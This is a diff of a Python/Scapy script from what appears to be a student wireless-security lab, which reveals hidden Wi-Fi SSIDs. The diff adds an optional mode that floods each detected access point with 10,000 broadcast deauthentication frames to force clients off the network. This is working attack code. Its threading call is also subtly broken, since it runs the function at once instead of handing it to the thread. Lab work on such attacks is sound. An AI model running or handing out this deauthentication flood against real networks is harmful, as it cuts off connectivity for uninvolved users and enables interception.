@@ -1,19 +1,24 @@
 # Source:
 # - https://gist.github.com/thepacketgeek/6876699
 # - https://docs.python.org/3/howto/curses.html
+# - https://stackoverflow.com/questions/8259001/python-argparse-command-line-flags-without-arguments
+# - https://fr.wikibooks.org/wiki/Programmation_Python/Les_threads
 #
 # Author: Victor Truan, Jerome Bagnoud | SWI - Labo 02 - Exo 03
 
 import argparse
 import curses
+import threading
 from scapy.all import *
 
 PAIR_DICT = dict()
 BROADCAST_MAC_ADDRESS = "FF:FF:FF:FF:FF:FF"
+NUMBER_OF_DEAUTH = 10000
 
 # Arguments
 parser = argparse.ArgumentParser(description="Ce script permet de detecter les SSID cache, et d'essayer de les reveler en lisant les Probe response de ces APs")
 parser.add_argument("-i", "--interface", required=True, help="l'interface a utiliser")
+parser.add_argument("-d", "--deauth", action='store_true', help="switch permettant de decider si on veut deauth les client afin de reveler les SSID cache plus vite, ameliore les chances de detecter les SSID cache, mais ne fonctionne pas tout le temps")
 
 arguments = parser.parse_args()
 
@@ -49,7 +54,19 @@ def packetHandling(stdscr):
                 PAIR_DICT[packet.addr2] = packet.info.decode()
                 updateBSSIDDisplay(stdscr)
 
+                if(arguments.deauth):
+                    # On demarre les threads de deauth
+                    deauthThread = threading.Thread(target=sendDeauth(packet.addr2))
+                    deauthThread.start()
+
     return decloakSSID
+
+# Cette fonction envoie des packets de deauth a tous les client connecte a l'adresse passe en parametre
+def sendDeauth(address):
+    deauthPacket = RadioTap() / Dot11(type=0, subtype=12, addr1=BROADCAST_MAC_ADDRESS, addr2=address, addr3=address) / Dot11Deauth(reason=7)
+
+    for i in range(0, NUMBER_OF_DEAUTH):
+        sendp(deauthPacket, iface=arguments.interface, verbose=False)
 
 def main(stdscr):
     # Empeche l'ecriture des caractere tape par curses
